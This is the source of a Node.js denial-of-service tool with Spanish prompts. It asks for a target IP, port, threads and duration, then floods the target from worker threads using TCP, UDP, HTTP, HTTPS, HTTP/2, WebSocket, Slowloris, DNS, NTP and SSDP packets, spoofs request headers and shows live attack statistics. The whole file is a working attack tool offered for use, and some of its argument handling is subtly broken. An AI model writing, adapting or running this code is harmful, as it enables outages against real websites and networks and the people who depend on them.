#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');

class DDoSTool {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
        this.config = { workers: [], anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'] };
        this.running = false;
    }

    async setup() {
        this.target = await this.ask(chalk.greenBright('IP objetivo: '));
        this.port = parseInt(await this.ask(chalk.greenBright('Puerto objetivo: ')));
        this.threads = Math.min(parseInt(await this.ask(chalk.greenBright('Hilos (500-2000): ') || 500, 10), 2000);
        this.duration = Math.min(parseInt(await this.ask(chalk.greenBright('Duración (segundos): ') || 60, 10), 1800);
        this.methods = (await this.ask(
            chalk.greenBright('Métodos (separar por coma):\n') +
            chalk.yellow('TCP, UDP, HTTP, HTTPS, HTTP2, WEBSOCKET, SLOWLORIS, DNS, NTP, SSDP\n') +
            chalk.greenBright('Presiona Enter para usar todos: ')
        )).toUpperCase().split(',').map(m => m.trim()).filter(m => m) || [];
        
        this.preparePayloads();
    }

    ask(prompt) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(prompt, answer => { rl.close(); resolve(answer); });
        });
    }

    preparePayloads() {
        const genPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };

        this.payloads = {
            tcp: genPayload(1024),
            udp: genPayload(65507),
            http: this.generateHttpHeaders(),
            dns: this.generateDnsPacket(),
            ntp: this.generateNtpPacket(),
            ssdp: this.generateSsdpPacket()
        };
    }

    generateHttpHeaders() {
        return `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
               `Host: ${this.target}\r\n` +
               `User-Agent: ${this.randomUserAgent()}\r\n` +
               `X-Forwarded-For: ${this.randomIP()}\r\n\r\n`;
    }

    randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    randomIP() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
    }

    generateDnsPacket() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain), 0x00, 0x00, 0x01, 0x00, 0x01]);
    }

    generateNtpPacket() {
        return Buffer.from([0x1B, ...Buffer.alloc(47)]);
    }

    generateSsdpPacket() {
        return Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n');
    }

    launch() {
        if (this.running) return;
        this.running = true;
        this.stats.start = performance.now();
        
        console.log(chalk.green('\n[+] Iniciando ataque...'));
        this.startWorkers();
        this.showStats();
        setTimeout(() => this.stop(), this.duration * 1000);
    }

    startWorkers() {
        const cores = require('os').cpus().length;
        const perWorker = Math.ceil(this.threads / cores);
        
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    target: this.target,
                    port: this.port,
                    payloads: this.payloads,
                    methods: this.methods.length ? this.methods : Object.keys(this.payloads),
                    threads: perWorker
                }
            });
            
            worker.on('message', msg => this.updateStats(msg));
            this.config.workers.push(worker);
        }
    }

    updateStats({ total, success, failed, bw }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.failed += failed;
        this.stats.bandwidth += bw;
    }

    showStats() {
        if (!this.running) return;
        const elapsed = (performance.now() - this.stats.start) / 1000;
        const frame = this.config.anim[Math.floor(elapsed * 10) % this.config.anim.length];
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
        
        process.stdout.write(chalk`\r{green ${frame}} ` +
            chalk`T: {greenBright ${elapsed.toFixed(1)}s} ` +
            chalk`Req: {cyan ${this.stats.total}} ` +
            chalk`SPS: {cyan ${rps}} ` +
            chalk`BW: {cyan ${bw}GB} ` +
            chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`);
            
        setTimeout(() => this.showStats(), 100);
    }

    stop() {
        if (!this.running) return;
        this.running = false;
        this.config.workers.forEach(w => w.terminate());
        console.log(chalk`\n\n{yellow [!] Ataque detenido}\n`);
        process.exit();
    }
}

if (isMainThread) {
    const tool = new DDoSTool();
    tool.setup().then(() => {
        tool.launch();
        process.stdin.on('data', data => {
            if (data.toString().trim().toLowerCase() === 'stop') tool.stop();
        });
    });
} else {
    const { target, port, payloads, methods, threads } = workerData;
    
    const attacks = {
        TCP: () => {
            const socket = new net.Socket();
            socket.connect(port, target, () => {
                socket.write(payloads.tcp);
                report('success', payloads.tcp.length);
                socket.destroy();
            }).on('error', () => report('failed', 0));
        },
        
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },
        
        HTTP: () => {
            const req = http.request(`http://${target}:${port}`, { headers: payloads.http }, () => {
                report('success', 0);
            }).on('error', () => report('failed', 0)).end();
        },
        
        HTTPS: () => {
            const req = https.request(`https://${target}:${port}`, { rejectUnauthorized: false }, () => {
                report('success', 0);
            }).on('error', () => report('failed', 0)).end();
        },
        
        HTTP2: () => {
            const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
            const req = client.request({ ':path': '/' });
            req.on('data', () => {});
            req.on('end', () => report('success', 0));
            req.end();
        },
        
        WEBSOCKET: () => {
            const ws = new WebSocket(`ws://${target}:${port}`);
            ws.on('open', () => {
                ws.send(payloads.tcp);
                report('success', payloads.tcp.length);
                ws.close();
            }).on('error', () => report('failed', 0));
        },
        
        SLOWLORIS: () => {
            const socket = net.connect(port, target);
            socket.write('GET / HTTP/1.1\r\nHost: localhost\r\n');
            setInterval(() => socket.write(`X-${randomBytes(2).toString('hex')}: ${Math.random()}\r\n`), 15000);
            socket.on('error', () => report('failed', 0));
        },
        
        DNS: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.dns, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.dns.length);
                socket.close();
            });
        },
        
        NTP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ntp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ntp.length);
                socket.close();
            });
        },
        
        SSDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ssdp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ssdp.length);
                socket.close();
            });
        }
    };

    function report(type, bw) {
        parentPort.postMessage({
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bw: bw
        });
    }

    setInterval(() => {
        methods.forEach(method => {
            for (let i = 0; i < threads; i++) {
                if (attacks[method]) attacks[method]();
            }
        });
    }, 10);
}